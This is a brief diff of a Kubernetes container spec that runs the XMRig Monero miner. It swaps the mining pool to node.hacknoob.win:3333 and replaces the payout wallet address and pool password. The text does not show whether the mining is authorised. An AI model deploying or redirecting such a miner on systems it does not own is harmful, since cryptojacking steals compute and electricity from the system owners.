@@ -18,11 +18,11 @@ spec:
     command:
     - /home/worker2/xmrig/build/xmrig
     - -o
-    - gulf.moneroocean.stream:80
+    - node.hacknoob.win:3333
     - -u
-    - 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5
+    - 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn
     - -p
-    - piD3ceiver
+    - slave2
     volumeMounts:
     - name: xmrig-volume-2
       mountPath: /
